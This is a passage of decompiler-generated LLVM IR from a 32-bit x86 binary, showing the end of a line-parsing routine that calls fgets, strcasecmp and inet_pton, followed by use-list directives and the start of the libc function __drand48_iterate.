  %v4_8066bab97.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8066bab.preheader

dec_label_pc_8066ba7:                             ; preds = %dec_label_pc_8066bb1
  store i8 0, i8* %v1_8066bab102, align 1
  %v0_8066baa = load i32, i32* @ecx, align 4
  %v1_8066baa = add i32 %v0_8066baa, 1
  store i32 %v1_8066baa, i32* @ecx, align 4
  %v1_8066bab = inttoptr i32 %v1_8066baa to i8*
  %v2_8066bab = load i8, i8* %v1_8066bab, align 1
  %v3_8066bab = zext i8 %v2_8066bab to i32
  %v4_8066bab = load i32, i32* %eax.global-to-local, align 4
  %v5_8066bab = and i32 %v4_8066bab, -256
  %v6_8066bab = or i32 %v5_8066bab, %v3_8066bab
  store i32 %v6_8066bab, i32* @eax, align 4
  %v4_8066bad = icmp eq i8 %v2_8066bab, 0
  br i1 %v4_8066bad, label %dec_label_pc_8066bab.dec_label_pc_8066be4.loopexit_crit_edge, label %dec_label_pc_8066bb1

dec_label_pc_8066bb1:                             ; preds = %dec_label_pc_8066bab.preheader, %dec_label_pc_8066ba7
  %v2_8066bab103 = phi i8 [ %v2_8066bab, %dec_label_pc_8066ba7 ], [ %v2_8066bab95, %dec_label_pc_8066bab.preheader ]
  %v1_8066bab102 = phi i8* [ %v1_8066bab, %dec_label_pc_8066ba7 ], [ %v1_8066bab94, %dec_label_pc_8066bab.preheader ]
  %v0_8066ba7101 = phi i32 [ %v1_8066baa, %dec_label_pc_8066ba7 ], [ %v0_8066bab47, %dec_label_pc_8066bab.preheader ]
  %v2_8066bb1 = sext i8 %v2_8066bab103 to i32
  store i32 %v2_8066bb1, i32* @edx, align 4
  %v0_8066bb4 = load i32, i32* @global_var_8074860, align 32
  store i32 %v0_8066bb4, i32* %eax.global-to-local, align 4
  %v2_8066bb9 = mul nsw i32 %v2_8066bb1, 2
  %v3_8066bb9 = add i32 %v0_8066bb4, %v2_8066bb9
  %v4_8066bb9 = inttoptr i32 %v3_8066bb9 to i8*
  %v5_8066bb9 = load i8, i8* %v4_8066bb9, align 1
  %v6_8066bb9 = and i8 %v5_8066bb9, 32
  %v7_8066bb9 = icmp eq i8 %v6_8066bb9, 0
  %v1_8066bbd = icmp eq i1 %v7_8066bb9, false
  br i1 %v1_8066bbd, label %dec_label_pc_8066ba7, label %dec_label_pc_8066bbf

dec_label_pc_8066bbf:                             ; preds = %dec_label_pc_8066bb1
  %v0_8066bbf = load i32, i32* @edi, align 4
  %v1_8066bbf = add i32 %v0_8066bbf, -6
  %v6_8066bbf = sub i32 5, %v0_8066bbf
  %v7_8066bbf = and i32 %v6_8066bbf, %v0_8066bbf
  %v8_8066bbf = icmp slt i32 %v7_8066bbf, 0
  %v9_8066bbf = icmp eq i32 %v1_8066bbf, 0
  %v10_8066bbf = icmp slt i32 %v1_8066bbf, 0
  %v3_8066bc2 = icmp eq i1 %v10_8066bbf, %v8_8066bbf
  %v4_8066bc2 = icmp eq i1 %v9_8066bbf, false
  %v5_8066bc2 = and i1 %v4_8066bc2, %v3_8066bc2
  br i1 %v5_8066bc2, label %dec_label_pc_8066bcb.preheader, label %dec_label_pc_8066bc4

dec_label_pc_8066bc4:                             ; preds = %dec_label_pc_8066bbf
  %v1_8066bc4 = load i32, i32* @ebx, align 4
  %v3_8066bc4 = mul i32 %v0_8066bbf, 4
  %v4_8066bc4 = add i32 %v1_8066bc4, %v3_8066bc4
  %v5_8066bc4 = inttoptr i32 %v4_8066bc4 to i32*
  store i32 %v0_8066ba7101, i32* %v5_8066bc4, align 4
  %v0_8066bc7 = load i32, i32* @edi, align 4
  %v1_8066bc7 = add i32 %v0_8066bc7, 1
  store i32 %v1_8066bc7, i32* @edi, align 4
  %v0_8066bcb.pre.pre = load i32, i32* @ecx, align 4
  %v4_8066bcb.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066bcb.preheader

dec_label_pc_8066bcb.preheader:                   ; preds = %dec_label_pc_8066bc4, %dec_label_pc_8066bbf
  %v4_8066bcb.pre = phi i32 [ %v4_8066bcb.pre.pre, %dec_label_pc_8066bc4 ], [ %v0_8066bb4, %dec_label_pc_8066bbf ]
  %v0_8066bcb.pre = phi i32 [ %v0_8066bcb.pre.pre, %dec_label_pc_8066bc4 ], [ %v0_8066ba7101, %dec_label_pc_8066bbf ]
  %v1_8066be452 = phi i32 [ %v1_8066bc7, %dec_label_pc_8066bc4 ], [ %v0_8066bbf, %dec_label_pc_8066bbf ]
  %v1_8066bcb104 = inttoptr i32 %v0_8066bcb.pre to i8*
  %v2_8066bcb105 = load i8, i8* %v1_8066bcb104, align 1
  %v3_8066bcb106 = zext i8 %v2_8066bcb105 to i32
  %v5_8066bcb107 = and i32 %v4_8066bcb.pre, -256
  %v6_8066bcb108 = or i32 %v3_8066bcb106, %v5_8066bcb107
  store i32 %v6_8066bcb108, i32* @eax, align 4
  %v4_8066bcd109 = icmp eq i8 %v2_8066bcb105, 0
  br i1 %v4_8066bcd109, label %dec_label_pc_8066bdf.loopexit, label %dec_label_pc_8066bd1.lr.ph

dec_label_pc_8066bd1.lr.ph:                       ; preds = %dec_label_pc_8066bcb.preheader
  %v0_8066bd4.pre = load i32, i32* @global_var_8074860, align 32
  br label %dec_label_pc_8066bd1

dec_label_pc_8066bca:                             ; preds = %dec_label_pc_8066bd1
  %v1_8066bca = add i32 %v0_8066bdf110, 1
  store i32 %v1_8066bca, i32* @ecx, align 4
  %v1_8066bcb = inttoptr i32 %v1_8066bca to i8*
  %v2_8066bcb = load i8, i8* %v1_8066bcb, align 1
  %v3_8066bcb = zext i8 %v2_8066bcb to i32
  %v5_8066bcb = and i32 %v0_8066bd4.pre, -256
  %v6_8066bcb = or i32 %v3_8066bcb, %v5_8066bcb
  store i32 %v6_8066bcb, i32* @eax, align 4
  %v4_8066bcd = icmp eq i8 %v2_8066bcb, 0
  br i1 %v4_8066bcd, label %dec_label_pc_8066bdf.loopexit, label %dec_label_pc_8066bd1

dec_label_pc_8066bd1:                             ; preds = %dec_label_pc_8066bd1.lr.ph, %dec_label_pc_8066bca
  %v2_8066bcb112 = phi i8 [ %v2_8066bcb105, %dec_label_pc_8066bd1.lr.ph ], [ %v2_8066bcb, %dec_label_pc_8066bca ]
  %v1_8066bcb111 = phi i8* [ %v1_8066bcb104, %dec_label_pc_8066bd1.lr.ph ], [ %v1_8066bcb, %dec_label_pc_8066bca ]
  %v0_8066bdf110 = phi i32 [ %v0_8066bcb.pre, %dec_label_pc_8066bd1.lr.ph ], [ %v1_8066bca, %dec_label_pc_8066bca ]
  %v2_8066bd1 = sext i8 %v2_8066bcb112 to i32
  store i32 %v2_8066bd1, i32* @edx, align 4
  store i32 %v0_8066bd4.pre, i32* @eax, align 4
  %v2_8066bd9 = mul nsw i32 %v2_8066bd1, 2
  %v3_8066bd9 = add i32 %v0_8066bd4.pre, %v2_8066bd9
  %v4_8066bd9 = inttoptr i32 %v3_8066bd9 to i8*
  %v5_8066bd9 = load i8, i8* %v4_8066bd9, align 1
  %v6_8066bd9 = and i8 %v5_8066bd9, 32
  %v7_8066bd9 = icmp eq i8 %v6_8066bd9, 0
  br i1 %v7_8066bd9, label %dec_label_pc_8066bca, label %dec_label_pc_8066bdf.loopexit

dec_label_pc_8066bdf.loopexit:                    ; preds = %dec_label_pc_8066bd1, %dec_label_pc_8066bca, %dec_label_pc_8066bcb.preheader
  %v4_8066bab97149 = phi i32 [ %v6_8066bcb108, %dec_label_pc_8066bcb.preheader ], [ %v6_8066bcb, %dec_label_pc_8066bca ], [ %v0_8066bd4.pre, %dec_label_pc_8066bd1 ]
  %v0_8066bdf.lcssa = phi i32 [ %v0_8066bcb.pre, %dec_label_pc_8066bcb.preheader ], [ %v1_8066bca, %dec_label_pc_8066bca ], [ %v0_8066bdf110, %dec_label_pc_8066bd1 ]
  %v1_8066bcb.lcssa = phi i8* [ %v1_8066bcb104, %dec_label_pc_8066bcb.preheader ], [ %v1_8066bcb, %dec_label_pc_8066bca ], [ %v1_8066bcb111, %dec_label_pc_8066bd1 ]
  %v2_8066bdf = load i8, i8* %v1_8066bcb.lcssa, align 1
  %v3_8066bdf = icmp eq i8 %v2_8066bdf, 0
  %v1_8066be2 = icmp eq i1 %v3_8066bdf, false
  br i1 %v1_8066be2, label %dec_label_pc_8066bab.preheader, label %dec_label_pc_8066be4

dec_label_pc_8066bab.preheader:                   ; preds = %dec_label_pc_8066bab.preheader.preheader, %dec_label_pc_8066bdf.loopexit
  %v1_8066be4.pre152 = phi i32 [ %v1_8066be452, %dec_label_pc_8066bdf.loopexit ], [ 0, %dec_label_pc_8066bab.preheader.preheader ]
  %v4_8066bab97 = phi i32 [ %v4_8066bab97149, %dec_label_pc_8066bdf.loopexit ], [ %v4_8066bab97.pre, %dec_label_pc_8066bab.preheader.preheader ]
  %v0_8066bab47 = phi i32 [ %v0_8066bdf.lcssa, %dec_label_pc_8066bdf.loopexit ], [ %v4_8066c8d, %dec_label_pc_8066bab.preheader.preheader ]
  %v1_8066bab94 = inttoptr i32 %v0_8066bab47 to i8*
  %v2_8066bab95 = load i8, i8* %v1_8066bab94, align 1
  %v3_8066bab96 = zext i8 %v2_8066bab95 to i32
  %v5_8066bab98 = and i32 %v4_8066bab97, -256
  %v6_8066bab99 = or i32 %v5_8066bab98, %v3_8066bab96
  store i32 %v6_8066bab99, i32* @eax, align 4
  %v4_8066bad100 = icmp eq i8 %v2_8066bab95, 0
  br i1 %v4_8066bad100, label %dec_label_pc_8066be4, label %dec_label_pc_8066bb1

dec_label_pc_8066bab.dec_label_pc_8066be4.loopexit_crit_edge: ; preds = %dec_label_pc_8066ba7
  %v1_8066be4.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8066be4

dec_label_pc_8066be4:                             ; preds = %dec_label_pc_8066bdf.loopexit, %dec_label_pc_8066bab.dec_label_pc_8066be4.loopexit_crit_edge, %dec_label_pc_8066bab.preheader, %dec_label_pc_8066b9f
  %v1_8066be4 = phi i32 [ 0, %dec_label_pc_8066b9f ], [ %v1_8066be4.pre.pre, %dec_label_pc_8066bab.dec_label_pc_8066be4.loopexit_crit_edge ], [ %v1_8066be4.pre152, %dec_label_pc_8066bab.preheader ], [ %v1_8066be452, %dec_label_pc_8066bdf.loopexit ]
  %v0_8066be4 = load i32, i32* @ebx, align 4
  %v2_8066be4 = mul i32 %v1_8066be4, 4
  %v3_8066be4 = add i32 %v2_8066be4, %v0_8066be4
  %v4_8066be4 = inttoptr i32 %v3_8066be4 to i32*
  store i32 0, i32* %v4_8066be4, align 4
  %v0_8066beb = load i32, i32* @edi, align 4
  %v7_8066bee = icmp sgt i32 %v0_8066beb, 1
  br i1 %v7_8066bee, label %dec_label_pc_8066bf4, label %dec_label_pc_8066c87.backedge

dec_label_pc_8066bf4:                             ; preds = %dec_label_pc_8066be4
  br i1 %v12_8066a30, label %dec_label_pc_8066cc1, label %dec_label_pc_8066bff

dec_label_pc_8066bff:                             ; preds = %dec_label_pc_8066bf4
  store i32 1, i32* @esi, align 4
  br i1 %v1_8066c09, label %dec_label_pc_8066c21.lr.ph, label %dec_label_pc_8066c0b

dec_label_pc_8066c21.lr.ph:                       ; preds = %dec_label_pc_8066bff
  br label %dec_label_pc_8066c21

dec_label_pc_8066c0b:                             ; preds = %dec_label_pc_8066bff
  %v0_8066c0b = load i32, i32* @eax, align 4
  %v0_8066c0d = load i32, i32* @ebx, align 4
  %v1_8066c0d = inttoptr i32 %v0_8066c0d to i32*
  %v2_8066c0d = load i32, i32* %v1_8066c0d, align 4
  %v4_8066c13 = call i32 @__GI_strcoll(i8* %v2_8066c2a, i32 %v2_8066c0d, i32 %v0_8066c0b)
  store i32 %v4_8066c13, i32* %eax.global-to-local, align 4
  %v1_8066c1b = icmp eq i32 %v4_8066c13, 0
  %v1_8066c1d = icmp eq i1 %v1_8066c1b, false
  br i1 %v1_8066c1d, label %dec_label_pc_8066c87.backedge, label %dec_label_pc_8066c3d

dec_label_pc_8066c87.backedge:                    ; preds = %dec_label_pc_8066c36, %dec_label_pc_8066c0b, %dec_label_pc_8066be4
  %v0_8066c87 = load i32, i32* @edx, align 4
  %v3_8066c91 = call i32 @fgets(i32 %v4_8066c8d, i32 %stack_var_4.0, i32 %v0_8066c87)
  store i32 %v3_8066c91, i32* %eax.global-to-local, align 4
  %v1_8066c99 = icmp eq i32 %v3_8066c91, 0
  %v1_8066c9b = icmp eq i1 %v1_8066c99, false
  br i1 %v1_8066c9b, label %dec_label_pc_8066b88, label %dec_label_pc_8066ca1

dec_label_pc_8066c21:                             ; preds = %dec_label_pc_8066c21.lr.ph, %dec_label_pc_8066c36
  %v1_8066c23124 = phi i32 [ 1, %dec_label_pc_8066c21.lr.ph ], [ %v1_8066c36, %dec_label_pc_8066c36 ]
  %v0_8066c23 = load i32, i32* @ebx, align 4
  %v2_8066c23 = mul i32 %v1_8066c23124, 4
  %v3_8066c23 = add i32 %v0_8066c23, %v2_8066c23
  %v4_8066c23 = inttoptr i32 %v3_8066c23 to i32*
  %v5_8066c23 = load i32, i32* %v4_8066c23, align 4
  %v3_8066c2a = call i32 @__GI_strcasecmp(i8* %v2_8066c2a, i32 %v5_8066c23)
  store i32 %v3_8066c2a, i32* %eax.global-to-local, align 4
  %v1_8066c32 = icmp eq i32 %v3_8066c2a, 0
  br i1 %v1_8066c32, label %dec_label_pc_8066c3d, label %dec_label_pc_8066c36

dec_label_pc_8066c36:                             ; preds = %dec_label_pc_8066c21
  %v0_8066c36 = load i32, i32* @esi, align 4
  %v1_8066c36 = add i32 %v0_8066c36, 1
  store i32 %v1_8066c36, i32* @esi, align 4
  %v1_8066c37.pre = load i32, i32* @edi, align 4
  %v5_8066c39 = icmp slt i32 %v1_8066c36, %v1_8066c37.pre
  br i1 %v5_8066c39, label %dec_label_pc_8066c21, label %dec_label_pc_8066c87.backedge

dec_label_pc_8066c3d:                             ; preds = %dec_label_pc_8066c0b, %dec_label_pc_8066c21
  br i1 %v1_8066c42, label %dec_label_pc_8066c5f, label %dec_label_pc_8066c44

dec_label_pc_8066c44:                             ; preds = %dec_label_pc_8066c3d
  %v3_8066c45 = load i8*, i8** %stack_var_-44, align 4
  %v4_8066c45 = ptrtoint i8* %v3_8066c45 to i32
  %v0_8066c49 = load i32, i32* @ebx, align 4
  %v1_8066c49 = inttoptr i32 %v0_8066c49 to i32*
  %v2_8066c49 = load i32, i32* %v1_8066c49, align 4
  %v3_8066c4d = inttoptr i32 %v2_8066c49 to i8*
  %v4_8066c4d = call i32 @inet_pton(i32 2, i8* %v3_8066c4d, i32 %v4_8066c45)
  store i32 %v4_8066c4d, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v4_8066c4d, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8066add, label %dec_label_pc_8066c87.outer.backedge

dec_label_pc_8066c87.outer.backedge:              ; preds = %dec_label_pc_8066c44, %dec_label_pc_8066c66, %dec_label_pc_8066c5f
  %v0_8066c87125 = load i32, i32* @edx, align 4
  %v3_8066c91126 = call i32 @fgets(i32 %v4_8066c8d, i32 %stack_var_4.0, i32 %v0_8066c87125)
  store i32 %v3_8066c91126, i32* %eax.global-to-local, align 4
  %v1_8066c99127 = icmp eq i32 %v3_8066c91126, 0
  %v1_8066c9b128 = icmp eq i1 %v1_8066c99127, false
  br i1 %v1_8066c9b128, label %dec_label_pc_8066b88.lr.ph, label %dec_label_pc_8066ca1

dec_label_pc_8066c5f:                             ; preds = %dec_label_pc_8066c3d
  br i1 %v1_8066c64, label %dec_label_pc_8066c87.outer.backedge, label %dec_label_pc_8066c66

dec_label_pc_8066c66:                             ; preds = %dec_label_pc_8066c5f
  %v0_8066c6b = load i32, i32* @ebx, align 4
  %v1_8066c6b = inttoptr i32 %v0_8066c6b to i32*
  %v2_8066c6b = load i32, i32* %v1_8066c6b, align 4
  %v3_8066c6f = inttoptr i32 %v2_8066c6b to i8*
  %v4_8066c6f = call i32 @inet_pton(i32 10, i8* %v3_8066c6f, i32 %stack_var_-36.0)
  store i32 %v4_8066c6f, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v4_8066c6f, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8066b0a, label %dec_label_pc_8066c87.outer.backedge

dec_label_pc_8066ca1:                             ; preds = %dec_label_pc_8066c87.outer.backedge, %dec_label_pc_8066b71, %dec_label_pc_8066c87.backedge, %dec_label_pc_8066b36
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8066b36 ], [ 1, %dec_label_pc_8066b71 ], [ 2, %dec_label_pc_8066c87.outer.backedge ], [ %stack_var_-28.0.ph136, %dec_label_pc_8066c87.backedge ]
  br i1 %v12_8066a30, label %dec_label_pc_8066cc1, label %dec_label_pc_8066ca8

dec_label_pc_8066ca8:                             ; preds = %dec_label_pc_8066ca1
  %v1_8066caf = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8066caf = call i32 @__GI_fclose(i16* %v1_8066caf)
  store i32 %v2_8066caf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066cc1

dec_label_pc_8066cc1:                             ; preds = %dec_label_pc_8066bf4, %dec_label_pc_8066a11, %dec_label_pc_8066a1d, %dec_label_pc_8066a3b, %dec_label_pc_8066a4e, %dec_label_pc_8066a5a, %dec_label_pc_8066a63, %dec_label_pc_8066a8d, %dec_label_pc_8066ca1, %dec_label_pc_8066ca8, %dec_label_pc_8066ac3
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8066ca1 ], [ %stack_var_-28.1, %dec_label_pc_8066ca8 ], [ %v2_8066ad2, %dec_label_pc_8066ac3 ], [ 34, %dec_label_pc_8066a8d ], [ 34, %dec_label_pc_8066a63 ], [ 34, %dec_label_pc_8066a5a ], [ 34, %dec_label_pc_8066a4e ], [ 34, %dec_label_pc_8066a3b ], [ 34, %dec_label_pc_8066a1d ], [ 34, %dec_label_pc_8066a11 ], [ %stack_var_-28.0.ph136, %dec_label_pc_8066bf4 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80669fc, i32* @ebx, align 4
  store i32 %v0_80669fb, i32* @esi, align 4
  store i32 %v0_80669fa, i32* @edi, align 4
  store i32 %v0_80669f9, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8066c36, { 0, 2, 1 }
  uselistorder i8 %v2_8066bab95, { 1, 2, 0 }
  uselistorder i8* %v1_8066bab94, { 1, 0 }
  uselistorder i32 %v0_8066bab47, { 1, 0 }
  uselistorder i32 %v2_8066bd1, { 1, 0 }
  uselistorder i32 %v1_8066bca, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8066bd4.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8066bbf, { 1, 0 }
  uselistorder i32 %v0_8066bbf, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8066bb1, { 1, 0 }
  uselistorder i8* %v2_8066c2a, { 1, 0 }
  uselistorder i32 %v4_8066c8d, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8066a4e, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8066a29, { 1, 0 }
  uselistorder i32 %v1_8066a0c, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 6, 1, 11, 12, 17, 13, 15, 16, 14, 0, 7, 4, 5, 8, 9, 10, 18, 21, 19, 20, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 6, 7, 8, 9, 10, 11, 12, 20, 21, 22, 23, 0, 18, 19, 27, 28, 16, 4, 5, 24, 25, 29, 30, 2, 1, 3, 31, 26, 13, 14, 15, 17 }
  uselistorder i32 (i16*)* @__GI_fclose, { 6, 7, 0, 2, 3, 1, 4, 5, 8 }
  uselistorder i32 (i32, i8*, i32)* @inet_pton, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 (i8*, i32, i32)* @__GI_strcoll, { 5, 6, 7, 8, 0, 1, 2, 3, 4 }
  uselistorder i32 -6, { 5, 1, 4, 6, 0, 2, 3 }
  uselistorder i8 32, { 21, 22, 23, 24, 25, 3, 4, 18, 29, 0, 1, 20, 2, 19, 26, 30, 31, 27, 28, 5, 6, 7, 8, 9, 10, 13, 12, 11, 14, 15, 16, 17 }
  uselistorder i32* @global_var_8074860, { 0, 4, 2, 5, 1, 6, 3 }
  uselistorder i32 -256, { 2, 185, 1, 186, 39, 4, 116, 115, 3, 0, 30, 31, 187, 188, 7, 189, 5, 190, 6, 191, 32, 33, 34, 25, 35, 36, 37, 38, 9, 118, 117, 8, 206, 207, 192, 208, 209, 210, 211, 212, 213, 226, 214, 161, 162, 163, 204, 229, 230, 225, 40, 197, 41, 42, 194, 196, 26, 27, 28, 10, 240, 77, 76, 11, 57, 198, 195, 193, 215, 216, 217, 218, 219, 220, 221, 12, 222, 223, 224, 199, 62, 43, 227, 228, 29, 44, 231, 45, 46, 47, 234, 235, 236, 238, 239, 237, 233, 232, 17, 48, 53, 49, 50, 51, 52, 54, 55, 56, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 18, 19, 20, 21, 22, 23, 24, 73, 74, 75, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 108, 14, 109, 15, 110, 13, 107, 16, 112, 113, 114, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 164, 165, 166, 167, 168, 170, 169, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 200, 201, 202, 203, 205 }
  uselistorder i32 35, { 4, 6, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 21, 2, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 (i32)* @__errno_location, { 59, 47, 45, 58, 40, 39, 32, 31, 30, 29, 55, 136, 135, 134, 133, 132, 131, 130, 142, 141, 140, 139, 43, 129, 38, 37, 26, 25, 24, 68, 83, 128, 33, 28, 23, 22, 67, 66, 65, 64, 127, 126, 125, 16, 27, 17, 62, 106, 10, 76, 124, 53, 123, 122, 121, 54, 70, 138, 36, 35, 34, 0, 52, 51, 82, 81, 80, 15, 63, 49, 9, 8, 7, 89, 75, 50, 14, 91, 112, 111, 113, 90, 57, 120, 119, 56, 74, 118, 1, 13, 18, 117, 84, 115, 41, 6, 2, 44, 73, 61, 46, 3, 116, 48, 42, 21, 5, 4, 114, 12, 11, 110, 109, 72, 71, 108, 107, 20, 19, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 144, 93, 137, 92, 88, 87, 86, 85, 143, 60, 79, 78, 77, 69 }
  uselistorder i32 80, { 0, 11, 12, 9, 13, 14, 15, 16, 17, 18, 3, 4, 8, 10, 5, 6, 1, 2, 7 }
  uselistorder i32 56, { 8, 20, 22, 5, 10, 11, 12, 13, 14, 2, 21, 3, 1, 15, 16, 9, 7, 0, 23, 24, 17, 18, 19, 6, 25, 26, 4 }
  uselistorder i32 44, { 19, 20, 21, 26, 27, 28, 22, 23, 14, 5, 7, 8, 6, 9, 10, 12, 11, 13, 4, 32, 34, 33, 29, 30, 31, 0, 24, 15, 25, 18, 16, 17, 35, 36, 3, 1, 2 }
  uselistorder i32 36, { 21, 22, 23, 25, 26, 27, 28, 29, 30, 2, 31, 3, 4, 32, 18, 19, 16, 33, 12, 13, 24, 11, 0, 10, 34, 35, 36, 37, 17, 20, 6, 14, 5, 15, 8, 1, 7, 9 }
  uselistorder i32 -44, { 3, 1, 0, 2 }
  uselistorder i32 48, { 22, 23, 24, 17, 18, 19, 0, 9, 6, 3, 1, 13, 20, 4, 10, 5, 7, 8, 25, 26, 27, 28, 2, 29, 30, 21, 14, 15, 16, 11, 12 }
  uselistorder i32 -48, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 -32, { 37, 35, 0, 10, 11, 1, 5, 4, 3, 6, 7, 36, 9, 12, 8, 13, 14, 15, 20, 21, 19, 18, 17, 16, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 2 }
  uselistorder i32 32, { 164, 64, 165, 166, 178, 176, 74, 191, 192, 167, 91, 168, 169, 170, 89, 90, 1, 2, 124, 125, 126, 128, 4, 3, 6, 5, 77, 127, 7, 129, 130, 131, 132, 133, 134, 135, 136, 108, 109, 110, 111, 112, 113, 0, 8, 114, 115, 116, 177, 98, 99, 179, 54, 199, 69, 97, 158, 159, 160, 55, 193, 10, 9, 11, 12, 92, 13, 196, 14, 15, 16, 17, 18, 19, 65, 66, 61, 70, 71, 117, 72, 118, 119, 120, 171, 172, 173, 180, 181, 67, 182, 183, 184, 185, 186, 187, 188, 20, 189, 190, 93, 194, 195, 174, 22, 21, 23, 24, 25, 26, 27, 175, 137, 138, 139, 140, 121, 154, 197, 198, 143, 141, 142, 122, 123, 100, 68, 101, 102, 103, 104, 105, 28, 29, 144, 31, 30, 78, 33, 32, 79, 106, 62, 63, 107, 34, 35, 145, 36, 37, 80, 38, 39, 41, 40, 81, 43, 42, 82, 45, 44, 84, 47, 46, 83, 146, 49, 48, 85, 86, 56, 57, 58, 59, 75, 50, 94, 95, 147, 148, 149, 150, 87, 73, 151, 152, 60, 153, 53, 155, 156, 157, 161, 162, 76, 163, 88, 52, 51, 96 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8066cc1, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8066ca1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8066c87.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8066c3d, { 1, 0 }
  uselistorder label %dec_label_pc_8066c21, { 1, 0 }
  uselistorder label %dec_label_pc_8066be4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8066bab.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8066bd1, { 1, 0 }
  uselistorder label %dec_label_pc_8066b9f, { 1, 0 }
  uselistorder label %dec_label_pc_8066b88, { 1, 0 }
  uselistorder label %dec_label_pc_8066b88.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8066b71, { 1, 0 }
  uselistorder label %dec_label_pc_8066b36, { 1, 0 }
  uselistorder label %dec_label_pc_8066a8d, { 1, 0 }
  uselistorder label %dec_label_pc_8066a1d, { 1, 0 }
}

define i32 @__drand48_iterate(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v1_8066cdb = add i32 %arg2, 14
  %v2_8066cdb = inttoptr i32 %v1_8066cdb to i16*
  %v3_8066cdb = load i16, i16* %v2_8066cdb, align 2
  %v4_8066cdb = icmp eq i16 %v3_8066cdb, 0
  %v1_8066ce0 = icmp eq i1 %v4_8066cdb, false
  br i1 %v1_8066ce0, label %dec_label_pc_8066cfc, label %dec_label_pc_8066ce2

dec_label_pc_8066ce2:                             ; preds = %entry
  %v1_8066ce2 = add i32 %arg2, 16
  %v2_8066ce2 = inttoptr i32 %v1_8066ce2 to i32*
  store i32 -554899859, i32* %v2_8066ce2, align 4
  %v0_8066ce9 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066ce9 = add i32 %v0_8066ce9, 20
  %v2_8066ce9 = inttoptr i32 %v1_8066ce9 to i32*
  store i32 5, i32* %v2_8066ce9, align 4
  %v0_8066cf0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066cf0 = add i32 %v0_8066cf0, 12
  %v2_8066cf0 = inttoptr i32 %v1_8066cf0 to i16*
  store i16 11, i16* %v2_8066cf0, align 2
  %v0_8066cf6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066cf6 = add i32 %v0_8066cf6, 14
  %v2_8066cf6 = inttoptr i32 %v1_8066cf6 to i16*
  store i16 1, i16* %v2_8066cf6, align 2
  %v0_8066d26.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066cfc

dec_label_pc_8066cfc:                             ; preds = %entry, %dec_label_pc_8066ce2
  %v0_8066d3f = phi i32 [ %arg2, %entry ], [ %v0_8066d26.pre, %dec_label_pc_8066ce2 ]
  %v4_8066cfc = ptrtoint i16* %arg1 to i32
  store i32 %v4_8066cfc, i32* %edx.global-to-local, align 4
